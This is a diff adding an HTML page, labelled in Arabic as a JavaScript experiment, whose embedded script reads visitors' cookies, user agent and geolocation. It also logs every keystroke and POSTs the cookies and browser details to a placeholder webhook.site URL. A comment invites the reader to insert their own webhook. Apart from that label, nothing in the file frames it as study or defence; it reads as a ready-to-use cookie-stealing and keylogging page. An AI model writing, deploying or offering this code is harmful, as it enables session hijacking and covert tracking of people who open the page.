@@ -1,0 +1,49 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>تجربة JavaScript متقدمة</title>
+</head>
+<body>
+  <h1>تجربة كود JavaScript عالمية 🌍</h1>
+  <p>جارٍ تنفيذ السكربت...</p>
+
+  <script>
+    // تنبيه
+    alert("مرحباً! تم تنفيذ السكربت ✅");
+
+    // معلومات عن المتصفح
+    console.log("User-Agent: " + navigator.userAgent);
+
+    // الكوكيز
+    console.log("Cookies: " + document.cookie);
+
+    // الموقع الجغرافي
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        console.log("الموقع:");
+        console.log("خط العرض: " + position.coords.latitude);
+        console.log("خط الطول: " + position.coords.longitude);
+      });
+    } else {
+      console.log("الموقع غير مدعوم");
+    }
+
+    // تسجيل الأزرار
+    document.addEventListener('keydown', function(e) {
+      console.log("زر تم الضغط عليه: " + e.key);
+    });
+
+    // إرسال البيانات إلى سيرفر (اختياري، استبدل الرابط برابط Webhook الخاص بك)
+    fetch("https://webhook.site/xxxxxx", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        time: new Date().toISOString()
+      })
+    });
+  </script>
+</body>
+</html>
